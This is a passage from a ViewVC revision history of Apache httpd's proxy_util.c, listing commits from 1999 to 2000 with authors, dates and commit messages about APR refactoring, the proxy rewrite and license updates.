is what I really care about.  This also renames CHARSET_EBCDIC to
AP_CHARSET_EBCDIC.  This is for namespace correctness, but it also makes
the exports script a bit easier.

```

---

Revision [**87399**](/viewvc?view=revision&revision=87399) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87399&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87399&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87399))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87399)

Modified
*Mon Dec 18 17:52:05 2000 UTC*
(24 years, 1 month ago)
by *trawick*

File length: 39411 byte(s)

Diff to [previous 87034](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87034&r2=87399)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87034&r2=87399&diff_format=h))
```
API routines ap_pgethostbyname() and ap_pduphostent() are no longer
available.  Use apr_getaddrinfo() instead.

The ap_pduphostent() code was moved to modules/proxy/proxy_util.c for
now since that is the only caller.  When the proxy's use of the
resolver is APR-ized this won't be needed anymore.

```

---

Revision [**87034**](/viewvc?view=revision&revision=87034) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87034&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87034&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87034))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87034)

Modified
*Mon Nov 20 18:10:19 2000 UTC*
(24 years, 2 months ago)
by *chuck*

File length: 37876 byte(s)

Diff to [previous 87001](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87001&r2=87034)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87001&r2=87034&diff_format=h))
```
Restore Ryan's original intent in ap_proxy_doconnect() return value check

```

---

Revision [**87001**](/viewvc?view=revision&revision=87001) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87001&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87001&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87001))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87001)

Modified
*Sat Nov 18 03:17:21 2000 UTC*
(24 years, 2 months ago)
by *rbb*

File length: 37875 byte(s)

Diff to [previous 86994](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86994&r2=87001)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86994&r2=87001&diff_format=h))
```
More proxy fixes.  There are still some bugs in this code, but this has
successfully proxied www.yahoo.com and www.ntrnet.net among other test
sites that I chose at random.

```

---

Revision [**86994**](/viewvc?view=revision&revision=86994) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86994&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86994&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86994))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86994)

Modified
*Fri Nov 17 17:26:32 2000 UTC*
(24 years, 2 months ago)
by *chuck*

File length: 37887 byte(s)

Diff to [previous 86990](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86990&r2=86994)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86990&r2=86994&diff_format=h))
```
fix apr_getaddrinfo() call

```

---

Revision [**86990**](/viewvc?view=revision&revision=86990) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86990&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86990&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86990))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86990)

Modified
*Fri Nov 17 03:45:02 2000 UTC*
(24 years, 2 months ago)
by *trawick*

File length: 37884 byte(s)

Diff to [previous 86988](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86988&r2=86990)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86988&r2=86990&diff_format=h))
```
APR: Change apr_connect() to take apr_sockaddr_t instead of hostname.
Add generic apr_create_socket().  Add apr_getaddrinfo() for doing
hostname resolution/address string parsing and building
apr_sockaddr_t.
Submitted by:	David Reid
Reviewed by:	Jeff Trawick

```

---

Revision [**86988**](/viewvc?view=revision&revision=86988) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86988&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86988&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86988))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86988)

Modified
*Fri Nov 17 00:19:30 2000 UTC*
(24 years, 2 months ago)
by *rbb*

File length: 38062 byte(s)

Diff to [previous 86978](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86978&r2=86988)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86978&r2=86988&diff_format=h))
```
This removes all BUFF's from the HTTP proxy.  This code is relatively
ugly, but it does proxy pages.  This even fixes the content-type bug
that I introduced yesterday sometime.  As soon as BUFF is removed from
the FTP proxy, the buff.c and buff.h files need to go away.

```

---

Revision [**86978**](/viewvc?view=revision&revision=86978) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86978&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86978&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86978))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86978)

Modified
*Thu Nov 16 01:57:46 2000 UTC*
(24 years, 2 months ago)
by *rbb*

File length: 39137 byte(s)

Diff to [previous 86961](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86961&r2=86978)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86961&r2=86978&diff_format=h))
```
Make the proxy work with filters.  We are still using BUFF for the
back-end communication, but BUFF has been removed from the communication
with the client.  The headers are not working correctly yet, but we are
making progress.  The most important part of this commit is that we are
able to actually filter data coming from the proxy.

```

---

Revision [**86961**](/viewvc?view=revision&revision=86961) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86961&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86961&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86961))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86961)

Modified
*Tue Nov 14 17:15:11 2000 UTC*
(24 years, 2 months ago)
by *chuck*

File length: 39335 byte(s)

Diff to [previous 86928](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86928&r2=86961)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86928&r2=86961&diff_format=h))
```
Simplify ap_proxy_doconnect(); now returns apr_status_t
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**86928**](/viewvc?view=revision&revision=86928) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86928&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86928&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86928))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86928)

Modified
*Sat Nov 11 18:34:10 2000 UTC*
(24 years, 2 months ago)
by *rbb*

File length: 39423 byte(s)

Diff to [previous 86927](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86927&r2=86928)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86927&r2=86928&diff_format=h))
```
The whole proxy compiles cleanly now.  Now we need to make it actually work
again, but at least we are making progress.

```

---

Revision [**86927**](/viewvc?view=revision&revision=86927) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86927&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86927&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86927))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86927)

Modified
*Sat Nov 11 18:13:04 2000 UTC*
(24 years, 2 months ago)
by *rbb*

File length: 38994 byte(s)

Diff to [previous 86923](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86923&r2=86927)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86923&r2=86927&diff_format=h))
```
proxy_ftp and proxy_http both compile now.  Not tested because the rest of
the proxy is still not compiling, but we are making progress.

```

---

Revision [**86923**](/viewvc?view=revision&revision=86923) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86923&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86923&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86923))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86923)

Modified
*Sat Nov 11 11:07:03 2000 UTC*
(24 years, 2 months ago)
by *chuck*

File length: 38962 byte(s)

Diff to [previous 86919](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86919&r2=86923)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86919&r2=86923&diff_format=h))
```
This is the 1.3.x current proxy into 2.0 - first stage
PR:
Obtained from: Sam Magnuson
Submitted by:  Chuck Murcko
Reviewed by:

```

---

Revision [**86919**](/viewvc?view=revision&revision=86919) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86919&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86919&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86919))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86919)

Modified
*Sat Nov 11 06:06:00 2000 UTC*
(24 years, 2 months ago)
by *rbb*

File length: 39404 byte(s)

Diff to [previous 86450](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86450&r2=86919)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86450&r2=86919&diff_format=h))
```
Not all platforms have INADDR_NONE defined by default.  Apache used to
check for this and the define it if needed.  Since APR also needs this
check it makes more sense for APR to just check and export a symobl that
is always available.
Submitted by:	Branko �ibej <brane@xbc.nu>
Reviewed by:	Ryan Bloom

```

---

Revision [**86450**](/viewvc?view=revision&revision=86450) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86450&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86450&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86450))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86450)

Modified
*Sun Oct 8 06:05:22 2000 UTC*
(24 years, 3 months ago)
by *wrowe*

File length: 39400 byte(s)

Diff to [previous 86440](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86440&r2=86450)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86440&r2=86450&diff_format=h))
```

  Missed it, a rather messy canonical error example.

```

---

Revision [**86440**](/viewvc?view=revision&revision=86440) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86440&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86440&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86440))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86440)

Modified
*Sun Oct 8 03:23:05 2000 UTC*
(24 years, 3 months ago)
by *rbb*

File length: 39377 byte(s)

Diff to [previous 86008](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86008&r2=86440)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=86008&r2=86440&diff_format=h))
```
Remove all compiler warnings from the proxy code.  There are no garauntees
that this still works, but most of the changes were just const-safeness
changes.
PR:	6631

```

---

Revision [**86008**](/viewvc?view=revision&revision=86008) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86008&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=86008&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=86008))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=86008)

Modified
*Sun Aug 6 06:07:53 2000 UTC*
(24 years, 5 months ago)
by *wrowe*

File length: 39006 byte(s)

Diff to [previous 85976](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85976&r2=86008)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85976&r2=86008&diff_format=h))
```

  Remaining cleanup of ap_ -> apr_ and AP_ -> APR_ transformation...
  see src/lib/apr/apr_compat.h for most details.
  Also a few minor nits to get Win32 to build.

PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**85976**](/viewvc?view=revision&revision=85976) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85976&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85976&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=85976))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=85976)

Modified
*Wed Aug 2 05:27:38 2000 UTC*
(24 years, 5 months ago)
by *dougm*

File length: 38976 byte(s)

Diff to [previous 85878](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85878&r2=85976)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85878&r2=85976&diff_format=h))
```
prefix libapr functions and types with apr_

```

---

Revision [**85878**](/viewvc?view=revision&revision=85878) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85878&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85878&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=85878))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=85878)

Modified
*Tue Jul 25 01:06:32 2000 UTC*
(24 years, 6 months ago)
by *wrowe*

File length: 38940 byte(s)

Diff to [previous 85563](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85563&r2=85878)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85563&r2=85878&diff_format=h))
```

  Add APR_EOL_STR for a platform specific text delimiter, provided by
  apr.h (defined in apr.h.in and apr.hw).  This is needed -only- in APR
  created files (true raw files) such as logs.  It is not required in any
  splat to screen (stderr/stdout) formatting, nor any html markup.

  Some other modules slipped through in the prior apr_strings.h commit.
  Sorry 'bout that.

PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**85563**](/viewvc?view=revision&revision=85563) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85563&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85563&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=85563))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=85563)

Modified
*Tue Jun 13 06:17:47 2000 UTC*
(24 years, 7 months ago)
by *chuck*

File length: 38942 byte(s)

Diff to [previous 85552](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85552&r2=85563)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85552&r2=85563&diff_format=h))
```
fixups for remaining current warnings

Submitted by:	Chuck Murcko

```

---

Revision [**85552**](/viewvc?view=revision&revision=85552) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85552&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85552&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=85552))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=85552)

Modified
*Mon Jun 12 21:41:58 2000 UTC*
(24 years, 7 months ago)
by *chuck*

File length: 39060 byte(s)

Diff to [previous 85081](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85081&r2=85552)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85081&r2=85552&diff_format=h))
```
New mod_proxy/mod_cache (file cache) for 2.0. This uses a caching API so
that shared mem, LDAP servers, DBs, etc. can also be used for proxy
caching. The caching API is very young, and subject to change as APR changes.

proxy_cache.c from the proxy subdir is no longer used.

Build with --enable-modules=proxy,cache

Lightly tested on Linux, no warranties expressed or implied yet.

Still to do:

strerror(), waitpid(), stat() cleanups
address issues marked by @@@FIXME
add HTTP/1.1

This should be considered a *reference* proxy implementation for 2.0. What
actually ends up shipping with 2.0 is likely going to be rather different as
the redesign evolves. This may end up being the 2.0 backwards compatibility
workalike.

Modified to work with today's conf/build/layout scheme

PR:
Obtained from:
Submitted by:	Sam Magnuson
Reviewed by:	Chuck Murcko

```

---

Revision [**85081**](/viewvc?view=revision&revision=85081) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85081&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85081&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=85081))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=85081)

Modified
*Fri Apr 28 18:27:55 2000 UTC*
(24 years, 9 months ago)
by *dougm*

File length: 38227 byte(s)

Diff to [previous 85074](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85074&r2=85081)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85074&r2=85081&diff_format=h))
```
back out APR_ prefix for TRUE,FALSE

```

---

Revision [**85074**](/viewvc?view=revision&revision=85074) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85074&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85074&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=85074))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=85074)

Modified
*Fri Apr 28 06:49:53 2000 UTC*
(24 years, 9 months ago)
by *dougm*

File length: 38259 byte(s)

Diff to [previous 85017](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85017&r2=85074)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=85017&r2=85074&diff_format=h))
```
prefix TRUE,FALSE with APR_

```

---

Revision [**85017**](/viewvc?view=revision&revision=85017) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85017&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=85017&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=85017))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=85017)

Modified
*Sun Apr 23 02:32:58 2000 UTC*
(24 years, 9 months ago)
by *fielding*

File length: 38227 byte(s)

Diff to [previous 84963](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84963&r2=85017)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84963&r2=85017&diff_format=h))
```
Finished move of ap_md5 routines to apr_md5.  Removed ap_md5.h.
Replaced more magic numbers with MD5_DIGESTSIZE.  Yuck.

Submitted by:	William Rowe, Roy Fielding

```

---

Revision [**84963**](/viewvc?view=revision&revision=84963) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84963&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84963&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=84963))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=84963)

Modified
*Fri Apr 14 15:59:20 2000 UTC*
(24 years, 9 months ago)
by *rbb*

File length: 38198 byte(s)

Diff to [previous 84879](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84879&r2=84963)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84879&r2=84963&diff_format=h))
```
Change ap_context_t to ap_pool_t.  This compiles, runs, and serves pages
on Linux, but probably breaks somewhere.

```

---

Revision [**84879**](/viewvc?view=revision&revision=84879) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84879&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84879&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=84879))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=84879)

Modified
*Fri Mar 31 09:05:25 2000 UTC*
(24 years, 10 months ago)
by *fielding*

File length: 38219 byte(s)

Diff to [previous 84751](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84751&r2=84879)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84751&r2=84879&diff_format=h))
```
Update to Apache Software License version 1.1

```

---

Revision [**84751**](/viewvc?view=revision&revision=84751) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84751&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84751&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=84751))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=84751)

Modified
*Mon Mar 13 20:27:29 2000 UTC*
(24 years, 10 months ago)
by *jim*

File length: 38364 byte(s)

Diff to [previous 84725](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84725&r2=84751)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84725&r2=84751&diff_format=h))
```
Backport the CSS security fixes to Apache 2.0a. Or is that forward
port? My sense of direction is all confused.

PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**84725**](/viewvc?view=revision&revision=84725) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84725&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84725&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=84725))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=84725)

Modified
*Fri Mar 10 00:07:37 2000 UTC*
(24 years, 10 months ago)
by *rbb*

File length: 38235 byte(s)

Diff to [previous 84135](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84135&r2=84725)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=84135&r2=84725&diff_format=h))
```
Fix all the License issues.  Including:
s/Apache Group/Apache Software Foundation/
s/1999/2000/
s/Sascha's license/ASF license

```

---

Revision [**84135**](/viewvc?view=revision&revision=84135) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84135&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=84135&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=84135))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=84135)

Modified
*Fri Nov 19 18:49:20 1999 UTC*
(25 years, 2 months ago)
by *rbb*

File length: 38109 byte(s)

Diff to [previous 83970](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83970&r2=84135)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83970&r2=84135&diff_format=h))
```
Finish the conversion from fprintf(stderr -> ap_log_err.

```

---

Revision [**83970**](/viewvc?view=revision&revision=83970) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83970&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83970&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=83970))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=83970)

Modified
*Mon Oct 11 22:40:18 1999 UTC*
(25 years, 3 months ago)
by *martin*

File length: 36833 byte(s)

Diff to [previous 83859](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83859&r2=83970)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83859&r2=83970&diff_format=h))
```
Remove most of the annoying "re ap_context_t mplement" mis-replacements
by what I think is their real meaning. Guys, I didn't verify all of this,
please have a close look at my "fixes". Thanks.

```

---

Revision [**83859**](/viewvc?view=revision&revision=83859) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83859&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83859&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=83859))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=83859)

Modified
*Tue Aug 31 21:54:52 1999 UTC*
(25 years, 5 months ago)
by *rbb*

File length: 36857 byte(s)

Diff to [previous 83852](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83852&r2=83859)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83852&r2=83859&diff_format=h))
```
Fix all of those annoying --i -> - ap_context_t problems caused by a
search/replace gone wrong.

```

---

Revision [**83852**](/viewvc?view=revision&revision=83852) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83852&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83852&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=83852))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=83852)

Modified
*Tue Aug 31 05:35:52 1999 UTC*
(25 years, 5 months ago)
by *rbb*

File length: 36881 byte(s)

Diff to [previous 83769](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83769&r2=83852)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83769&r2=83852&diff_format=h))
```
Changed pools to contexts.  Tested with prefork and pthread mpm's.  I'll
check this out tomorrow and make sure everything was checked in correctly.

```

---

Revision [**83769**](/viewvc?view=revision&revision=83769) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83769&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83769&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=83769))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=83769)

Modified
*Thu Aug 26 14:15:07 1999 UTC*
(25 years, 5 months ago)
by *fielding*

File length: 36767 byte(s)

Diff to [previous 83751](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83751&r2=83769)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=83751&r2=83769&diff_format=h))
```
Changes from pthreads.  Removes timeouts, adds mutex.
This probably breaks the proxy on everything but pthreads.

Submitted by:	Bill Stoddard

```

---

Revision [**83751**](/viewvc?view=revision&revision=83751) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83751&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=83751&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=83751))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=83751)

Added
